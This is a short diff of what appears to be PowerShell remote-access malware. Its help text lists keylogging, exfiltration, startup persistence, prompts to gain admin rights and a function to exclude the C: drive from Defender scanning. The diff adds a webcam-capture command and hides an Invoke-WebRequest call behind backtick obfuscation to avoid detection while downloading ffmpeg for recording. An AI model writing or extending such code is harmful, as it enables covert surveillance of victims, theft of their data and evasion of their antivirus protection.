@@ -66,6 +66,7 @@ Remove-Persistance   : Remove Startup Persistance
 Is-Admin   : Checks if session has admin Privileges
 Attempt-Elevate  : Send user a prompt to gain Admin
 Message   : Send a custom message to the user
+Take-Picture  : Send a Webcann picture.
 Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
 **ADMIN ONLY FUNCTIONS**
 Disable-AV   : Attempt to exclude C:/ from Defender
@@ -483,11 +484,10 @@ if (-not (Test-Path -Path $outputFolder)) {
 if (-not (Test-Path -Path $tempFolder)) {
     New-Item -ItemType Directory -Path $tempFolder | Out-Null
 }
-
 $ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
 $ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
 if (-not (Test-Path -Path $ffmpegZip)) {
-    Invoke-WebRequest -Uri $ffmpegDownload -OutFile $ffmpegZip
+    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
 }
 Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
 $videoDevice = $null
